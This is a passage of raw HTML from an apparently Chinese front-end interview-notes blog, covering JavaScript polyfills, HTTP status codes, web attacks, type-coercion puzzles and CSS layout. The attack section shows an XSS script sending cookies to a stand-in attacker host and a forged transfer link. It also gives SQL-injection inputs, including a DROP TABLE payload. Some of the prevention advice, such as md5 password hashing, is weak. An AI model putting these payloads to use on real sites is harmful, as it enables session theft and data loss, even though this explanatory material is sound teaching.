class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Function</span>.prototype.myApply = <span class="function"><span class="keyword">function</span>(<span class="params">obj, arr</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">let</span> args = [];</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; arr.length; i++)&#123;</span><br><span class="line">    args.push( <span class="string">'arr['</span> + i + <span class="string">']'</span> );  <span class="comment">// 这里也是push 字符串</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">eval</span>( <span class="string">'this.myCall(obj,'</span> + args + <span class="string">')'</span> );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>3.3 非es6</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Function</span>.prototype.myApply = <span class="function"><span class="keyword">function</span>(<span class="params">obj, arr</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">let</span> args = [];</span><br><span class="line">  <span class="keyword">let</span> val ;</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; arr.length; i++)&#123;</span><br><span class="line">    args.push( <span class="string">'arr['</span> + i + <span class="string">']'</span> ) ;</span><br><span class="line">  &#125;</span><br><span class="line">  obj._fn_ = <span class="keyword">this</span>;</span><br><span class="line">  val = <span class="built_in">eval</span>( <span class="string">'obj._fn_('</span> + args + <span class="string">')'</span> ) </span><br><span class="line">  <span class="keyword">delete</span> obj._fn_;</span><br><span class="line">  <span class="keyword">return</span> val</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>模拟bind<br>4.1 es6 + myApply方法</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Function</span>.prototype.myBind = <span class="function"><span class="keyword">function</span>(<span class="params">obj,...arg1</span>)</span>&#123;   <span class="comment">//arg1收集剩余参数</span></span><br><span class="line">  <span class="keyword">return</span> <span class="function">(<span class="params">...arg2</span>) =&gt;</span> &#123;   <span class="comment">//返回箭头函数, this绑定调用这个方法(myFind)的函数对象</span></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.myApply( obj, arg1.concat(arg2) );   <span class="comment">// 将参数合并</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>4.2 es6</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Function</span>.prototype.myBind = <span class="function"><span class="keyword">function</span>(<span class="params">obj, ...arg1</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="function">(<span class="params">...arg2</span>) =&gt;</span> &#123; </span><br><span class="line">    <span class="keyword">let</span> args = arg1.concat(arg2);</span><br><span class="line">    <span class="keyword">let</span> val ;</span><br><span class="line">    obj._fn_ = <span class="keyword">this</span>;</span><br><span class="line">    val = obj._fn_( ...args ); </span><br><span class="line">    <span class="keyword">delete</span> obj._fn_;</span><br><span class="line">    <span class="keyword">return</span> val</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>4.3 非es6</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Function</span>.prototype.myFind = <span class="function"><span class="keyword">function</span>(<span class="params">obj</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">let</span> _this = <span class="keyword">this</span>;</span><br><span class="line">  <span class="keyword">let</span> argArr = [];</span><br><span class="line">  <span class="keyword">let</span> arg1 = [];</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">1</span>; i &lt; <span class="built_in">arguments</span>.length; i++)&#123;  </span><br><span class="line">    arg1.push( <span class="built_in">arguments</span>[i] );</span><br><span class="line">    argArr.push( <span class="string">'arg1['</span> + (i - <span class="number">1</span>)  + <span class="string">']'</span> ) ;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">let</span> val ;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="built_in">arguments</span>.length; i++)&#123;</span><br><span class="line">      argArr.push( <span class="string">'arguments['</span> + i + <span class="string">']'</span> ) ;</span><br><span class="line">    &#125;</span><br><span class="line">    obj._fn_ = _this;</span><br><span class="line">    <span class="built_in">console</span>.log(argArr);</span><br><span class="line">    val = <span class="built_in">eval</span>( <span class="string">'obj._fn_('</span> + argArr + <span class="string">')'</span> ) ;</span><br><span class="line">    <span class="keyword">delete</span> obj._fn_;</span><br><span class="line">    <span class="keyword">return</span> val;</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><hr><h2 id="简述http工作原理"><a href="#简述http工作原理" class="headerlink" title="简述http工作原理"></a>简述http工作原理</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><h3 id="常见的http状态码："><a href="#常见的http状态码：" class="headerlink" title="常见的http状态码："></a>常见的http状态码：</h3><ul><li><p><strong>1XX系列</strong>：指定客户端应相应的某些动作，代表请求已被接受，需要继续处理。</p></li><li><p><strong>2XX系列</strong>：代表请求已成功被服务器接收、理解、并接受。<br>200(成功): 请求成功<br>201(已创建): 请求成功并且服务器创建了新的资源<br>202(已接受): 服务器已接受请求，但尚未处理</p></li><li><p><strong>3XX系列</strong>：代表需要客户端采取进一步的操作才能完成请求，这些状态码用来重定向，后续的请求地址（重定向目标）在本次响应的 Location 域中指明。<br>300(多种选择): 针对请求，服务器可执行多种操作<br>301(永久移动): 被请求的资源已永久移动到新位置<br>302(临时移动): 服务器目前从不同位置的网页响应请求，但请求者应继续使用原有位置来进行以后的请求</p></li><li><p><strong>4XX系列</strong>：代表了客户端看起来可能发生了错误，妨碍了服务器的处理。<br>400(错误请求): 服务器不理解请求的语法<br>401(未授权): 请求要求身份验证<br>403(拒绝): 服务器已经理解请求，但是拒绝执行它<br>404(未找到): 服务器找不到请求的网页<br>413(请求实体过大): 请求实体过大，服务器无法处理请求<br>414(请求的URI过长): 请求的 URI（通常为网址）过长，服务器无法处理</p></li><li><p><strong>5xx系列</strong>：代表了服务器在处理请求的过程中有错误或者异常状态发生。<br>500(服务器内部错误): 服务器错误<br>502(错误网关): 服务器作为网关或代理，从上游服务器收到无效响应<br>505(HTTP版本不受支持): 服务器不支持请求中所用的 HTTP 协议版本</p></li></ul><hr><h2 id="几种常见web攻击手段"><a href="#几种常见web攻击手段" class="headerlink" title="几种常见web攻击手段"></a>几种常见web攻击手段</h2><p>前端面试只需答 <code>XSS</code> 和 <code>CSRF</code> 两种</p><h3 id="XSS-跨站脚本攻击"><a href="#XSS-跨站脚本攻击" class="headerlink" title="XSS(跨站脚本攻击)"></a>XSS(跨站脚本攻击)</h3><ul><li><p>概念<br>全称是跨站脚本攻击（Cross Site Scripting），指攻击者在网页中嵌入恶意脚本程序。</p></li><li><p>案例<br>比如说我写了一个博客网站，然后攻击者在上面发布了一个文章，内容是这样的<code>&lt;script&gt;window.open(“www.gongji.com?param=”+document.cookie)&lt;/script&gt;</code>,如果我没有对他的内容进行处理，直接存储到数据库，那么下一次当其他用户访问他的这篇文章的时候，服务器从数据库读取后然后响应给客户端，浏览器执行了这段脚本，然后就把该用户的cookie发送到攻击者的服务器了。</p></li><li><p>被攻击的原因<br>用户输入的数据变成了代码，比如说上面的<code>&lt;script&gt;</code>,应该只是字符串却有了代码的作用。</p></li><li><p>预防<br>将输入的数据进行转义处理，比如说讲 <code>&lt;</code> 转义成<code>&amp;lt；</code></p></li></ul><h3 id="CSRF-跨站请求伪造"><a href="#CSRF-跨站请求伪造" class="headerlink" title="CSRF(跨站请求伪造)"></a>CSRF(跨站请求伪造)</h3><ul><li><p>概念<br>全称是跨站请求伪造(cross-site request forgery),指通过伪装成受信任用户的进行访问，通俗的讲就是说我访问了A网站，然后cookie存在了浏览器，然后我又访问了一个流氓网站，不小心点了流氓网站一个链接（向A发送请求），这个时候流氓网站利用了我的身份对A进行了访问。</p></li><li><p>案例<br>1、这个例子可能现实中不会存在，但是攻击的方式是一样的。比如说我登录了A银行网站，然后我又访问了室友给的一个流氓网站，然后点了里面的一个链接 <a href="http://www.A.com/transfer?account=666&amp;money=10000,那么这个时候很可能我就向账号为666的人转了1w。" target="_blank" rel="noopener">www.A.com/transfer?account=666&amp;money=10000,那么这个时候很可能我就向账号为666的人转了1w。</a><br>2、注意这个攻击方式不一定是我点了这个链接，也可以是这个网站里面一些资源请求指向了这个转账链接。</p></li><li><p>被攻击的原因<br>用户本地存储cookie，攻击者利用用户的cookie进行认证，然后伪造用户发出请求。</p></li><li><p>预防<br>1、之所以被攻击是因为攻击者利用了存储在浏览器用于用户认证的cookie，那么如果我们不用cookie来验证不就可以预防了。所以我们可以采用token（不存储于浏览器）认证。</p><p>2、通过referer识别，HTTP Referer是header的一部分，当浏览器向web服务器发送请求的时候，一般会带上Referer，告诉服务器我是从哪个页面链接过来的，服务器基此可以获得一些信息用于处理。那么这样的话，我们必须登录银行A网站才能进行转账了。</p></li></ul><h3 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h3><ul><li><p>概念<br>通过sql命令伪装成正常的http请求参数，传递到服务器端，服务器执行sql命令造成对数据库进行攻击。</p></li><li><p>案例<br>1、<code>&#39; or &#39;1&#39;= &#39;1</code>。这是最常见的sql注入攻击，当我们输如用户名 <code>jiajun</code> ，然后密码输如 <code>&#39;or &#39;1&#39;= &#39;1</code>的时候，我们在查询用户名和密码是否正确的时候，本来要执行的是 <code>select * from user where username=&#39;&#39; and password=&#39;&#39;</code>,经过参数拼接后，会执行sql语句 <code>select * from user where username=&#39;jaijun&#39; and password=&#39; &#39; or &#39;1&#39;=&#39;1&#39;</code>，这个时候1=1是成立，自然就跳过验证了。</p><p>2、但是如果再严重一点，密码输如的是 <code>&#39;;drop table user;--</code>，那么sql命令为 <code>select * from user where username=&#39;jiajun&#39; and password=&#39;&#39;;drop table user;--&#39;</code> 这个时候我们就直接把这个表给删除了。</p></li><li><p>被攻击的原因<br>sql语句伪造参数，然后在对参数进行拼接的后形成破坏性的sql语句，最后导致数据库受到攻击。</p></li><li><p>预防<br>1、在java中，我们可以使用预编译语句(PreparedStatement)，这样的话即使我们使用sql语句伪造成参数，到了服务端的时候，这个伪造sql语句的参数也只是简单的字符，并不能起到攻击的作用。</p><p>2、很多orm框架已经可以对参数进行转义。</p><p>3、做最坏的打算，即使被’拖库‘(‘脱裤，数据库泄露’)。数据库中密码不应明文存储的，可以对密码使用md5进行加密，为了加大破解成本，所以可以采用加盐的（数据库存储用户名，盐（随机字符长），md5后的密文）方式。</p></li></ul><h3 id="DDOS"><a href="#DDOS" class="headerlink" title="DDOS"></a>DDOS</h3><ul><li><p>概念<br>分布式拒绝服务攻击（Distributed Denial of Service），简单说就是发送大量请求是使服务器瘫痪。DDos攻击是在DOS攻击基础上的，可以通俗理解，dos是单挑，而ddos是群殴，因为现代技术的发展，dos攻击的杀伤力降低，所以出现了DDOS，攻击者借助公共网络，将大数量的计算机设备联合起来，向一个或多个目标进行攻击。</p></li><li><p>案例<br>1、SYN Flood ,简单说一下tcp三次握手，客户端先服务器发出请求，请求建立连接，然后服务器返回一个报文，表明请求以被接受，然后客户端也会返回一个报文，最后建立连接。那么如果有这么一种情况，攻击者伪造ip地址，发出报文给服务器请求连接，这个时候服务器接受到了，根据tcp三次握手的规则，服务器也要回应一个报文，可是这个ip是伪造的，报文回应给谁呢，第二次握手出现错误，第三次自然也就不能顺利进行了，这个时候服务器收不到第三次握手时客户端发出的报文，又再重复第二次握手的操作。如果攻击者伪造了大量的ip地址并发出请求，这个时候服务器将维护一个非常大的半连接等待列表，占用了大量的资源，最后服务器瘫痪。</p><p>2、CC攻击，在应用层http协议上发起攻击，模拟正常用户发送大量请求直到该网站拒绝服务为止。</p></li><li><p>被攻击的原因<br>服务器带宽不足，不能挡住攻击者的攻击流量。</p></li><li><p>预防<br>1、最直接的方法增加带宽。但是攻击者用各地的电脑进行攻击，他的带宽不会耗费很多钱，但对于服务器来说，带宽非常昂贵。<br>2、云服务提供商有自己的一套完整DDoS解决方案，并且能提供丰富的带宽资源。</p></li></ul><hr><h2 id="‘1’-‘2’-‘3’-map-parseInt"><a href="#‘1’-‘2’-‘3’-map-parseInt" class="headerlink" title="[‘1’, ‘2’, ‘3’].map(parseInt);"></a>[‘1’, ‘2’, ‘3’].map(parseInt);</h2><p>结果：<code>[1, NaN, NaN]</code></p><p>考察知识点：<code>map</code>和<code>parseInt</code></p><ul><li><p><code>map</code>传递两个参数：<code>Array.map(element, index, array)</code></p></li><li><p><code>parseInt</code>传递两个参数：<code>parseInt(string, radix)</code><br>参数radix表示进制数，2~36，如果不设置或为0，则默认取10进制转换，如果小于0、等于1或大于36，则返回<code>NaN</code></p></li></ul><p>原题先转换成：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">[<span class="string">'1'</span>, <span class="string">'2'</span>, <span class="string">'3'</span>].map(<span class="function"><span class="keyword">function</span> (<span class="params">element</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">`<span class="subst">$&#123;element&#125;</span>`</span>; <span class="comment">// ["1", "2", "3"]</span></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">[<span class="string">'1'</span>, <span class="string">'2'</span>, <span class="string">'3'</span>].map(<span class="function"><span class="keyword">function</span> (<span class="params">element, index</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">`<span class="subst">$&#123;element&#125;</span>-<span class="subst">$&#123;index&#125;</span>`</span>; <span class="comment">// ["1-0", "2-1", "3-2"]</span></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">[<span class="string">'1'</span>, <span class="string">'2'</span>, <span class="string">'3'</span>].map(<span class="function"><span class="keyword">function</span> (<span class="params">element, index, array</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">`<span class="subst">$&#123;element&#125;</span>-<span class="subst">$&#123;index&#125;</span>-<span class="subst">$&#123;array&#125;</span>`</span>; <span class="comment">// ["1-0-1,2,3", "2-1-1,2,3", "3-2-1,2,3"]</span></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">[<span class="string">'1'</span>, <span class="string">'2'</span>, <span class="string">'3'</span>].map(<span class="function"><span class="keyword">function</span> (<span class="params">element, index, array, other</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">`<span class="subst">$&#123;element&#125;</span>-<span class="subst">$&#123;index&#125;</span>-<span class="subst">$&#123;array&#125;</span>-<span class="subst">$&#123;other&#125;</span>`</span>; <span class="comment">// ["1-0-1,2,3-undefined", "2-1-1,2,3-undefined", "3-2-1,2,3-undefined"]</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p><p>由此可以也可以看出，map的参数最多3个。<br>原题先求执行 <code>map</code> ，然后再执行括号中的 <code>parseInt</code>，<code>parseInt</code> 接收的参数是 <code>map</code> 中的 <code>element</code> 和 <code>index</code><br>所以原题再转换成：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">parseInt</span>(<span class="string">'1'</span>, <span class="number">0</span>); <span class="comment">// 1</span></span><br><span class="line"><span class="built_in">parseInt</span>(<span class="string">'2'</span>, <span class="number">1</span>); <span class="comment">// NaN，因为没有1进制</span></span><br><span class="line"><span class="built_in">parseInt</span>(<span class="string">'3'</span>, <span class="number">2</span>); <span class="comment">// NaN，虽然有二进制，但是2进制中没有3</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 同理</span></span><br><span class="line"><span class="built_in">parseInt</span>(<span class="string">'4'</span>, <span class="number">3</span>)</span><br><span class="line"><span class="built_in">parseInt</span>(<span class="string">'5'</span>, <span class="number">4</span>)</span><br><span class="line"><span class="built_in">parseInt</span>(<span class="string">'6'</span>, <span class="number">5</span>)</span><br><span class="line">[<span class="string">'1'</span>, <span class="string">'2'</span>, <span class="string">'3'</span>, <span class="string">'4'</span>, <span class="string">'5'</span>, <span class="string">'6'</span>].map(<span class="built_in">parseInt</span>); <span class="comment">// [1, NaN, NaN, NaN, NaN, NaN]</span></span><br></pre></td></tr></table></figure></p><hr><h2 id="false为什么为true"><a href="#false为什么为true" class="headerlink" title="[]==false为什么为true"></a>[]==false为什么为true</h2><p>js隐式转换：</p><ol><li>数字 == 字符串    =&gt;  数字 == 数字</li><li>数字 == 布尔值    =&gt;  数字 == 数字</li><li>字符串 == 布尔值  =&gt;  数字 == 数字</li><li>对象 == 布尔值    =&gt;  对象 == 数字</li><li>对象 == 数字      =&gt;  字符串 == 数字</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">[] == <span class="literal">false</span>; <span class="comment">// true</span></span><br><span class="line">!![] == <span class="literal">false</span>; <span class="comment">// false</span></span><br><span class="line"></span><br><span class="line"><span class="string">''</span> == <span class="literal">false</span>; <span class="comment">// true;</span></span><br><span class="line">!!<span class="string">''</span> == <span class="literal">false</span>; <span class="comment">// true</span></span><br><span class="line"><span class="string">''</span> == <span class="number">0</span>; <span class="comment">// true</span></span><br><span class="line">!!<span class="string">''</span> == <span class="number">0</span>; <span class="comment">// true</span></span><br><span class="line"></span><br><span class="line">[<span class="number">1</span>] == <span class="string">'1'</span>; <span class="comment">// true</span></span><br><span class="line"><span class="literal">null</span> == <span class="number">0</span>; <span class="comment">// false</span></span><br><span class="line"><span class="literal">null</span> == <span class="literal">false</span>; <span class="comment">// false</span></span><br><span class="line"><span class="literal">null</span> == <span class="string">''</span>; <span class="comment">// false</span></span><br><span class="line"><span class="literal">null</span> == <span class="literal">undefined</span>; <span class="comment">// true</span></span><br><span class="line"></span><br><span class="line"><span class="number">0</span> == <span class="literal">false</span>; <span class="comment">// true</span></span><br><span class="line"><span class="number">1</span> == <span class="literal">true</span>; <span class="comment">// true</span></span><br><span class="line"><span class="number">2</span> == <span class="literal">true</span>; <span class="comment">// false</span></span><br></pre></td></tr></table></figure><p>本题转换过程如下：</p><ol><li>[] == false; // 对象和布尔值，如果有布尔值，先将布尔值转换成数字</li><li>[] == 0; // 原值和非原值，把非原值转换成原值，toString()方法</li><li>‘’ == 0; // 字符串和数字，把字符串转换成数字，Number()方法</li><li>0 == 0;</li></ol><hr><h2 id="今日头条CSS面试题"><a href="#今日头条CSS面试题" class="headerlink" title="今日头条CSS面试题"></a>今日头条CSS面试题</h2><p>css布局实现以下要求（主要考察css布局、padding设置为百分比时的参照物）：</p><ul><li>1.子级div左右距离父级边界各50px</li><li>2.子级div垂直居中</li><li>3.子级div高度是宽度的一半</li></ul><p>注：css margin、padding的left、right、top、bottom设置为百分比时都是以父级的width为参照</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"outer"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"inner"</span>&gt;</span>ABCD<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.outer</span>&#123;</span><br><span class="line">  <span class="comment">/*  父级内部实现水平、垂直居中  */</span></span><br><span class="line">  <span class="attribute">display</span>: flex;</span><br><span class="line">  <span class="attribute">align-items</span>: center;</span><br><span class="line">  <span class="attribute">justify-content</span>: center;</span><br><span class="line">  </span><br><span class="line">  <span class="attribute">border</span>: <span class="number">5px</span> solid <span class="number">#f00</span>;</span><br><span class="line">  <span class="attribute">width</span>:<span class="number">400px</span>;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">300px</span>;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/*  需求1：子级左右距离父级边距各50px（先不实现这个，最后实现） */</span></span><br><span class="line">  <span class="attribute">padding</span>: <span class="number">0</span> <span class="number">50px</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.inner</span>&#123;</span><br><span class="line">  <span class="attribute">border</span>: <span class="number">5px</span> solid <span class="number">#0f0</span>;</span><br><span class="line">  <span class="attribute">color</span>: <span class="number">#000</span>;</span><br><span class="line">  <span class="attribute">font-size</span>: <span class="number">20px</span>;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/*  需求2：子级内部实现水平、垂直居中  */</span></span><br><span class="line">  <span class="attribute">display</span>: flex;</span><br><span class="line">  <span class="attribute">align-items</span>: center;</span><br><span class="line">  <span class="attribute">justify-content</span>: center;</span><br><span class="line">  <span class="attribute">flex</span>: <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*  需求3：子级内部高度为父级宽度的一半  */</span> </span><br><span class="line">  <span class="attribute">padding</span>: <span class="number">25%</span> <span class="number">0</span>;</span><br><span class="line">  <span class="comment">/*  设置height: 0, 防止文字增加高度  */</span></span><br><span class="line">  <span class="attribute">height</span>:<span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注：当不实现 <strong>需求1</strong> 的时候，<strong>需求3</strong> 中自己内部高度为50%，即为父级（outer div）宽度的一半，此时由于inner div设置了flex布局（<strong>需求2</strong>），导致子级宽度和父级宽度一样，最后再实现 <strong>需求1</strong>，父级增加左右padding。</p><p>效果如下：<br><img src="../images/css/css_box.png" title="css布局"></p><hr><h2 id="今日头条算法推导题"><a href="#今日头条算法推导题" class="headerlink" title="今日头条算法推导题"></a>今日头条算法推导题</h2><p>假设在今日头条里面，有很多工作人员检查新闻是不是属于虚假新闻，所有新闻真实率到达了98%，工作人员在检验一个真实的新闻把它检验为一个虚假的新闻的概率为2%，而一个虚假的新闻被检验为真实的新闻的概率为5%. 那么，一个被检验为真实的新闻确实是真实的新闻的概率是多大?</p><p>A.0.9991</p><p>B.0.9989</p><p>C.0.9855</p><p>D.0.96</p><p>答案:B</p><p>分析条件得到：<br>真的新闻：98%<br>假的新闻：2%<br>真的-&gt;假的：2%<br>假的-&gt;真的：5%</p><p>分析要求：被检验为真实的新闻确实是真实的新闻</p><p>首先要明确被检验为真实的新闻包括了（本来是真的和本来是假的）所以分子为（真-&gt;真），分母为（真-&gt;真 + 假-&gt;真）</p><p>结果为：（真-&gt;真）/（真-&gt;真 + 假-&gt;真） = (98%<em>(1-2%)) / (98%</em>(1-2%) + 2%*5%) = 0.9604/0.9614 = 0.9989……</p><hr><h2 id="阿里钉钉面试题"><a href="#阿里钉钉面试题" class="headerlink" title="阿里钉钉面试题"></a>阿里钉钉面试题</h2><ul><li><p>排除数组指定内容(考察filter用法)</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* 说明：实现一个exclude方法，从数组中排除掉指定内容</span></span><br><span class="line"><span class="comment">* 示例：</span></span><br><span class="line"><span class="comment">*  exclude([1, 2, 'a', 2], 2); // 返回 [1, 'a']</span></span><br><span class="line"><span class="comment">*  exclude([1, 'a', 2, 'a'], 1, 'a'); // 返回 [2]</span></span><br><span class="line"><span class="comment">*  exclude([1, 2, 3]); // 返回 [1, 2, 3]</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">exclude</span>(<span class="params">arr, ...param</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// 注：不定参数用...param表示，param是数据对象，无该参数时表示空数组</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">// 额外拓展：arguments囊括所以的参数</span></span><br><span class="line">  <span class="comment">// arguments: 可以取到不定参数的具体内容, </span></span><br><span class="line">  <span class="comment">//    如 exclude([1, 2, 'a', 2], 2) 则输出[[1, 2, 'a', 2], 2]</span></span><br><span class="line">  <span class="comment">//    如 exclude([1, 'a', 2, 'a'], 1, 'a') 则输出[[1, 2, 'a', 2], 1, 'a']</span></span><br><span class="line">  <span class="comment">// arguments.length 表示参数的个数，这样可以取到不定参数的个数</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* 代码实现 */</span></span><br><span class="line">  <span class="keyword">return</span> arr.filter(<span class="function">(<span class="params">item, index, self</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> !param.includes(item); <span class="comment">// 注filter return语句中为true则保留，为false则去除</span></span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>字符频率统计（考察sort方法、字符串charCodeAt方法）</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">  * 说明：给定一个字符串，将字符串里的字符按照出现的频率升序排列并统计输出。</span></span><br><span class="line"><span class="comment">  *   1. 字符串的字符只有小写字母</span></span><br><span class="line"><span class="comment">  *   2. 输出格式是字符+频次，如 aaaa 输出 a4</span></span><br><span class="line"><span class="comment">  *   3. 升序排序优先按频次排序，频次相同时按字母升序排序，如  ccbbabaa 输出 c2a3b3 </span></span><br><span class="line"><span class="comment">  * 示例：</span></span><br><span class="line"><span class="comment">  *   frequency('dabhppa');  // 输出 b1d1h1a2p2</span></span><br><span 